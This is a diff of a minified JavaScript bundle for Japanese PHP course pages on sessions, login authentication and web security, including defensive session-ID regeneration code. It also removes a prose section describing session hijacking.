2zm10-10V7a4 4 0 00-8 0v4h8z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"セキュリティ対策"}),e.jsx("div",{className:"text-sm text-slate-600",children:"SQLインジェクション対策（bindValue必須）"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-purple-600 mr-3 mt-0.5",children:e.jsxs("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:[e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"}),e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M15 12a3 3 0 11-6 0 3 3 0 016 0z"})]})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"関数化によるコード改善"}),e.jsx("div",{className:"text-sm text-slate-600",children:"db_conn(), sql_error(), redirect() で再利用性向上"})]})]})]})})})]})}function de(d={}){const{wrapper:s}={...t(),...d.components};return s?e.jsx(s,{...d,children:e.jsx(I,{...d})}):I(d)}function p(d,s){throw new Error("Expected component `"+d+"` to be defined: you likely forgot to import, pass, or provide it.")}const ie=Object.freeze(Object.defineProperty({__proto__:null,default:de},Symbol.toStringTag,{value:"Module"}));function P(d){const s={code:"code",h1:"h1",h2:"h2",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...t(),...d.components},{Callout:r,Details:n,Infographic:l,Mermaid:i}=s;return r||u("Callout"),n||u("Details"),l||u("Infographic"),i||u("Mermaid"),e.jsxs(e.Fragment,{children:[e.jsx(s.h1,{children:"#04 PHP - セッション・認証・セキュリティ"}),`
+`,e.jsx(n,{summary:"今回学んだこと",children:e.jsx(l,{children:e.jsxs("div",{className:"space-y-3",children:[e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-blue-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M4 7v10c0 2.21 3.582 4 8 4s8-1.79 8-4V7M4 7c0 2.21 3.582 4 8 4s8-1.79 8-4M4 7c0-2.21 3.582-4 8-4s8 1.79 8 4"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"データベースの基本概念"}),e.jsx("div",{className:"text-sm text-slate-600",children:"RDB、テーブル、RDBMS、SQLの関係性"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-green-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v14a2 2 0 002 2z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"SQL基本文法（CRUD）"}),e.jsx("div",{className:"text-sm text-slate-600",children:"INSERT、SELECT、UPDATE、DELETE、WHERE、ORDER BY"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-orange-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"PDOによるDB接続"}),e.jsx("div",{className:"text-sm text-slate-600",children:"PHP からデータベースへの安全な接続方法"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-red-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"セキュリティ対策"}),e.jsx("div",{className:"text-sm text-slate-600",children:"SQLインジェクション対策（bindValue必須）"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-purple-600 mr-3 mt-0.5",children:e.jsxs("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:[e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"}),e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M15 12a3 3 0 11-6 0 3 3 0 016 0z"})]})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"関数化によるコード改善"}),e.jsx("div",{className:"text-sm text-slate-600",children:"db_conn(), sql_error(), redirect() で再利用性向上"})]})]})]})})})]})}function de(d={}){const{wrapper:s}={...t(),...d.components};return s?e.jsx(s,{...d,children:e.jsx(T,{...d})}):T(d)}function p(d,s){throw new Error("Expected component `"+d+"` to be defined: you likely forgot to import, pass, or provide it.")}const ie=Object.freeze(Object.defineProperty({__proto__:null,default:de},Symbol.toStringTag,{value:"Module"}));function I(d){const s={a:"a",code:"code",h1:"h1",h2:"h2",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...t(),...d.components},{Callout:r,Details:n,Infographic:l,Mermaid:i}=s;return r||u("Callout"),n||u("Details"),l||u("Infographic"),i||u("Mermaid"),e.jsxs(e.Fragment,{children:[e.jsx(s.h1,{children:"#03 PHP - ユーザ管理"}),`
 `,e.jsx(n,{summary:"今回のゴール",children:e.jsxs(s.ul,{children:[`
 `,e.jsx(s.li,{children:"セッションとログイン認証の仕組みを理解する"}),`
 `,e.jsx(s.li,{children:"ハッシュ化によるパスワード保護を実装する"}),`
-`,e.jsx(s.li,{children:"セッションハイジャック攻撃とその対策を学ぶ"}),`
 `,e.jsx(s.li,{children:"実用的なユーザー認証システムを構築する"}),`
 `,e.jsx(s.li,{children:"セキュリティ意識を高め、安全なWebアプリケーション開発を身につける"}),`
 `]})}),`
-`,e.jsxs(n,{summary:"授業前準備",children:[e.jsx(r,{type:"tip",title:"毎回の準備作業",children:e.jsx(s.p,{children:"PHPの授業では毎回同じ手順で環境を準備します。今回はユーザー認証が加わります。"})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"1. XAMPP起動"})}),e.jsxs(s.ul,{children:[`
-`,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"Windows"}),": Apache と MySQL が緑色"]}),`
-`,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"Mac"}),': MySQL Database と Apache Web Server が "Running"']}),`
+`,e.jsxs(r,{type:"note",title:"配布コード",children:[e.jsxs(s.p,{children:["zipファイルをダウンロード後に展開し、XAMPPの",e.jsx(s.code,{children:"htdocs"}),"フォルダに配置してください！"]}),e.jsxs(s.ul,{children:[`
+`,e.jsxs(s.li,{children:["講義内資料: ",e.jsx(s.a,{href:"../../zip/php03.zip",children:"php03.zip"})]}),`
+`]})]}),`
+`,e.jsxs(n,{summary:"授業前準備",children:[e.jsx(s.p,{children:e.jsx(s.strong,{children:"1. XAMPP起動"})}),e.jsxs(s.ul,{children:[`
+`,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"Windows"}),": Apache と MySQL が緑色になっていればOK"]}),`
+`,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"Mac"}),': MySQL Database と Apache Web Server が "Running" になっていればOK']}),`
 `]}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"2. ファイル配置"})}),e.jsxs(s.ul,{children:[`
 `,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"Windows"}),": ",e.jsx(s.code,{children:"C:/XAMPP/htdocs/php03/"})]}),`
 `,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"Mac"}),": ",e.jsx(s.code,{children:"/Applications/XAMPP/htdocs/php03/"})]}),`
@@ -4256,14 +4284,18 @@ if ($status == false) {
 `,e.jsxs(s.li,{children:[e.jsx(s.code,{children:"http://localhost/php03/"})," にアクセス"]}),`
 `]})]}),`
 `,e.jsx(s.h2,{children:"セッション（SESSION）の基礎"}),`
-`,e.jsxs(n,{summary:"セッションとは何か？",children:[e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"セッション"}),"とは、ユーザーがWebサイトにアクセスしてから離脱するまでの一連の期間のことです。"]}),e.jsx(r,{type:"info",title:"HTTPの根本的な問題",children:e.jsxs(s.p,{children:["HTTPは",e.jsx(s.strong,{children:"ステートレス"}),"なプロトコルのため、各リクエストが独立していて、サーバーは前回のやりとりを覚えていません。"]})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"ステートレスの問題を体感してみましょう："})}),e.jsx(l,{children:e.jsxs("div",{className:"space-y-3",children:[e.jsxs("div",{className:"flex items-start p-3 bg-red-50 rounded border border-red-200",children:[e.jsx("div",{className:"w-6 h-6 text-red-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L4.082 15.5c-.77.833.192 2.5 1.732 2.5z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"1. ログインページにアクセス"}),e.jsx("div",{className:"text-sm text-slate-600",children:"サーバー: 「はじめまして！」"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-red-50 rounded border border-red-200",children:[e.jsx("div",{className:"w-6 h-6 text-red-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L4.082 15.5c-.77.833.192 2.5 1.732 2.5z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"2. ログイン処理を送信"}),e.jsx("div",{className:"text-sm text-slate-600",children:"サーバー: 「はじめまして！（誰だっけ？）」"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-red-50 rounded border border-red-200",children:[e.jsx("div",{className:"w-6 h-6 text-red-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L4.082 15.5c-.77.833.192 2.5 1.732 2.5z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"3. 商品ページにアクセス"}),e.jsx("div",{className:"text-sm text-slate-600",children:"サーバー: 「はじめまして！（また知らない人だ）」"})]})]})]})}),e.jsx(s.p,{children:"これでは毎回ログインが必要になってしまいます！"})]}),`
-`,e.jsxs(n,{summary:"セッションとCookieの仕組み",children:[e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"セッション"}),"と",e.jsx(s.strong,{children:"Cookie"}),"を組み合わせることで、サーバー側でユーザー情報を管理できます。"]}),e.jsx(l,{children:e.jsxs("div",{className:"space-y-4",children:[e.jsxs("div",{className:"text-center",children:[e.jsx("div",{className:"inline-flex items-center justify-center w-16 h-16 bg-slate-100 rounded-full mb-4",children:e.jsx("div",{className:"w-8 h-8 text-slate-600",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z"})})})}),e.jsx("div",{className:"font-medium text-slate-800 mb-2",children:"セッション管理の基本構造"})]}),e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-6",children:[e.jsxs("div",{className:"p-4 bg-blue-50 rounded border border-blue-200",children:[e.jsxs("div",{className:"flex items-center mb-3",children:[e.jsx("div",{className:"w-6 h-6 text-blue-600 mr-2",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"})})}),e.jsx("div",{className:"font-medium text-blue-800",children:"Cookie（クッキー）"})]}),e.jsx("div",{className:"text-sm text-blue-700",children:e.jsxs(s.p,{children:[e.jsx("strong",{children:"役割:"})," セッションIDを保存・送信",e.jsx("br",{}),`
+`,e.jsxs(n,{summary:"セッションとは何か？",children:[e.jsxs(s.ul,{children:[`
+`,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"セッション"}),"とは、ユーザーがWebサイトにアクセスしてから離脱するまでの一連の期間のこと"]}),`
+`]}),e.jsx(r,{type:"info",title:"HTTPの根本的な問題",children:e.jsxs(s.p,{children:["HTTPは",e.jsx(s.strong,{children:"ステートレス"}),"なプロトコルのため、各リクエストが独立していて、サーバーは前回のやりとりを覚えていません。"]})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"ステートレスの問題を体感してみましょう："})}),e.jsx(l,{children:e.jsxs("div",{className:"space-y-3",children:[e.jsxs("div",{className:"flex items-start p-3 bg-red-50 rounded border border-red-200",children:[e.jsx("div",{className:"w-6 h-6 text-red-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L4.082 15.5c-.77.833.192 2.5 1.732 2.5z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"1. ログインページにアクセス"}),e.jsx("div",{className:"text-sm text-slate-600",children:"サーバー: 「はじめまして！」"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-red-50 rounded border border-red-200",children:[e.jsx("div",{className:"w-6 h-6 text-red-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L4.082 15.5c-.77.833.192 2.5 1.732 2.5z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"2. ログイン処理を送信"}),e.jsx("div",{className:"text-sm text-slate-600",children:"サーバー: 「はじめまして！（誰だっけ？）」"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-red-50 rounded border border-red-200",children:[e.jsx("div",{className:"w-6 h-6 text-red-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L4.082 15.5c-.77.833.192 2.5 1.732 2.5z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"3. 商品ページにアクセス"}),e.jsx("div",{className:"text-sm text-slate-600",children:"サーバー: 「はじめまして！（また知らない人だ）」"})]})]})]})}),e.jsx(s.p,{children:"これでは毎回ログインが必要になってしまいます！"})]}),`
+`,e.jsxs(n,{summary:"セッションとCookieの仕組み",children:[e.jsxs(s.ul,{children:[`
+`,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"セッション"}),"と",e.jsx(s.strong,{children:"Cookie"}),"を組み合わせることで、サーバー側でユーザー情報を管理できる"]}),`
+`]}),e.jsx(l,{children:e.jsx("div",{className:"space-y-4",children:e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-6",children:[e.jsxs("div",{className:"p-4 bg-blue-50 rounded border border-blue-200",children:[e.jsxs("div",{className:"flex items-center mb-3",children:[e.jsx("div",{className:"w-6 h-6 text-blue-600 mr-2",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"})})}),e.jsx("div",{className:"font-medium text-blue-800",children:"Cookie（クッキー）"})]}),e.jsx("div",{className:"text-sm text-blue-700",children:e.jsxs(s.p,{children:[e.jsx("strong",{children:"役割:"})," セッションIDを保存・送信",e.jsx("br",{}),`
 `,e.jsx("strong",{children:"保存場所:"})," ブラウザ",e.jsx("br",{}),`
 `,e.jsx("strong",{children:"容量:"})," 最大4KB程度",e.jsx("br",{}),`
 `,e.jsx("strong",{children:"内容:"})," セッションIDのみ（データは含まない）"]})})]}),e.jsxs("div",{className:"p-4 bg-green-50 rounded border border-green-200",children:[e.jsxs("div",{className:"flex items-center mb-3",children:[e.jsx("div",{className:"w-6 h-6 text-green-600 mr-2",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M5 12h14M5 12a2 2 0 01-2-2V6a2 2 0 012-2h6l2 2h6a2 2 0 012 2v4a2 2 0 01-2 2H5a2 2 0 01-2-2z"})})}),e.jsx("div",{className:"font-medium text-green-800",children:"セッション"})]}),e.jsx("div",{className:"text-sm text-green-700",children:e.jsxs(s.p,{children:[e.jsx("strong",{children:"役割:"})," ユーザー情報を管理",e.jsx("br",{}),`
 `,e.jsx("strong",{children:"保存場所:"})," サーバー",e.jsx("br",{}),`
 `,e.jsx("strong",{children:"容量:"})," 制限なし",e.jsx("br",{}),`
-`,e.jsx("strong",{children:"内容:"})," ユーザーID、権限、設定等"]})})]})]})]})}),e.jsx(r,{type:"info",title:"重要なポイント",children:e.jsx(s.p,{children:"Cookieには「セッションID」だけが保存され、実際のデータはサーバー側にあります。これにより、セキュリティを保ちながら状態を管理できます。"})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"セッション管理のフロー："})}),e.jsx(i,{children:`
+`,e.jsx("strong",{children:"内容:"})," ユーザーID、権限、設定等"]})})]})]})})}),e.jsx(r,{type:"info",title:"重要なポイント",children:e.jsx(s.p,{children:"Cookieには「セッションID」だけが保存され、実際のデータはサーバー側にあります。これにより、セキュリティを保ちながら状態を管理できます。"})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"セッション管理のフロー："})}),e.jsx(i,{children:`
 sequenceDiagram
   participant C as ユーザー・ブラウザ
   participant S as Webサーバー
@@ -4286,7 +4318,9 @@ sequenceDiagram
   
   S->>C: 4. ユーザー情報に基づいた<br/>適切なレスポンスを送信
 `})]}),`
-`,e.jsxs(n,{summary:"LocalStorageとの違い",children:[e.jsx(s.p,{children:"過去にLocalStorageを学習しましたが、セッションとの違いは何でしょうか？"}),e.jsx(l,{children:e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-6",children:[e.jsxs("div",{className:"p-4 bg-orange-50 rounded border border-orange-200",children:[e.jsxs("div",{className:"flex items-center mb-3",children:[e.jsx("div",{className:"w-6 h-6 text-orange-600 mr-2",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"})})}),e.jsx("div",{className:"font-medium text-orange-800",children:"LocalStorage"})]}),e.jsx("div",{className:"text-sm text-orange-700",children:e.jsxs(s.p,{children:[e.jsx("strong",{children:"実行場所:"})," ブラウザ（クライアントサイド）",e.jsx("br",{}),`
+`,e.jsxs(n,{summary:"LocalStorageとの違い",children:[e.jsxs(s.ul,{children:[`
+`,e.jsx(s.li,{children:"LocalStorageとセッションの違いは...？"}),`
+`]}),e.jsx(l,{children:e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-6",children:[e.jsxs("div",{className:"p-4 bg-orange-50 rounded border border-orange-200",children:[e.jsxs("div",{className:"flex items-center mb-3",children:[e.jsx("div",{className:"w-6 h-6 text-orange-600 mr-2",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"})})}),e.jsx("div",{className:"font-medium text-orange-800",children:"LocalStorage"})]}),e.jsx("div",{className:"text-sm text-orange-700",children:e.jsxs(s.p,{children:[e.jsx("strong",{children:"実行場所:"})," ブラウザ（クライアントサイド）",e.jsx("br",{}),`
 `,e.jsx("strong",{children:"データ保存:"})," ブラウザ内",e.jsx("br",{}),`
 `,e.jsx("strong",{children:"セキュリティ:"})," JavaScriptから読み取り可能",e.jsx("br",{}),`
 `,e.jsx("strong",{children:"用途:"})," 設定、一時的なデータ保存"]})})]}),e.jsxs("div",{className:"p-4 bg-green-50 rounded border border-green-200",children:[e.jsxs("div",{className:"flex items-center mb-3",children:[e.jsx("div",{className:"w-6 h-6 text-green-600 mr-2",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M5 12h14M5 12a2 2 0 01-2-2V6a2 2 0 012-2h6l2 2h6a2 2 0 012 2v4a2 2 0 01-2 2H5a2 2 0 01-2-2z"})})}),e.jsx("div",{className:"font-medium text-green-800",children:"PHP セッション"})]}),e.jsx("div",{className:"text-sm text-green-700",children:e.jsxs(s.p,{children:[e.jsx("strong",{children:"実行場所:"})," サーバー（サーバーサイド）",e.jsx("br",{}),`
@@ -4326,14 +4360,17 @@ echo "名前: " . $name . "<br>";
 echo "年齢: " . $age . "<br>";
 echo "ログイン時刻: " . $login_time;
 ?>
-`})}),e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"セッションの保存場所確認："}),`
-`,e.jsx(s.code,{children:"http://localhost/dashboard/phpinfo.php"})," にアクセスして ",e.jsx(s.code,{children:"session.save_path"})," を確認してみましょう。"]}),e.jsx(r,{type:"info",title:"セッションファイルの場所",children:e.jsx(s.p,{children:"セッションデータは実際のファイルとしてサーバーに保存されます。セッションIDに対応するファイル名で管理されています。"})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"セッションIDの再発行（セキュリティ対策）："})}),e.jsx(s.pre,{children:e.jsx(s.code,{className:"language-php",children:`<?php
+`})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"セッションの保存場所確認："})}),e.jsxs(s.ul,{children:[`
+`,e.jsxs(s.li,{children:[e.jsx(s.code,{children:"http://localhost/dashboard/phpinfo.php"})," にアクセスして ",e.jsx(s.code,{children:"session.save_path"})," を確認"]}),`
+`]}),e.jsx(r,{type:"info",title:"セッションファイルの場所",children:e.jsx(s.p,{children:"セッションデータは実際のファイルとしてサーバーに保存されます。セッションIDに対応するファイル名で管理されています。"})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"セッションIDの再発行（セキュリティ対策）："})}),e.jsx(s.pre,{children:e.jsx(s.code,{className:"language-php",children:`<?php
 // セッション固定攻撃を防ぐため、ログイン時にIDを再発行
 session_regenerate_id(true); // trueで古いセッションファイルを削除
 ?>
 `})})]}),`
 `,e.jsx(s.h2,{children:"ユーザー認証システムの実装"}),`
-`,e.jsxs(n,{summary:"認証システムの全体像",children:[e.jsx(s.p,{children:"今回実装する認証システムの流れを理解しましょう："}),e.jsx(i,{children:`
+`,e.jsxs(n,{summary:"認証システムの全体像",children:[e.jsxs(s.ul,{children:[`
+`,e.jsx(s.li,{children:"今回実装する認証システムの流れは..."}),`
+`]}),e.jsx(i,{children:`
 graph TD
   A[ログインページ] -->|ID・パスワード入力| B[ログイン処理]
   B -->|認証成功| C[セッション作成]
@@ -4478,106 +4515,6 @@ redirect('login.php');
 `,e.jsx(s.li,{children:"セッションクッキーの削除"}),`
 `,e.jsx(s.li,{children:"セッション自体の破棄"}),`
 `,e.jsx(s.li,{children:"ログインページへのリダイレクト"}),`
-`]})]})]}),`
-`,e.jsx(s.h2,{children:"セッションハイジャック攻撃と対策"}),`
-`,e.jsxs(n,{summary:"セッションハイジャックとは",children:[e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"セッションハイジャック"}),"は、攻撃者が他人のセッションIDを盗み取り、その人になりすましてシステムにアクセスする攻撃手法です。"]}),e.jsxs(r,{type:"danger",title:"攻撃の深刻さ",children:[e.jsx(s.p,{children:"セッションハイジャックが成功すると："}),e.jsxs(s.ul,{children:[`
-`,e.jsx(s.li,{children:"正規ユーザーの権限を完全に奪取"}),`
-`,e.jsx(s.li,{children:"機密情報へのアクセス"}),`
-`,e.jsx(s.li,{children:"データの改ざん・削除"}),`
-`,e.jsx(s.li,{children:"管理者権限の乗っ取り"}),`
-`]})]}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"主な攻撃手法："})}),e.jsx(l,{children:e.jsxs("div",{className:"space-y-3",children:[e.jsxs("div",{className:"flex items-start p-3 bg-red-50 rounded border border-red-200",children:[e.jsx("div",{className:"w-6 h-6 text-red-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"1. ネットワーク盗聴"}),e.jsx("div",{className:"text-sm text-slate-600",children:"HTTP通信を傍受してセッションIDを取得"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-red-50 rounded border border-red-200",children:[e.jsx("div",{className:"w-6 h-6 text-red-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v14a2 2 0 002 2z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"2. XSS攻撃"}),e.jsx("div",{className:"text-sm text-slate-600",children:"悪意のあるスクリプトでCookieを盗み取る"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-red-50 rounded border border-red-200",children:[e.jsx("div",{className:"w-6 h-6 text-red-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 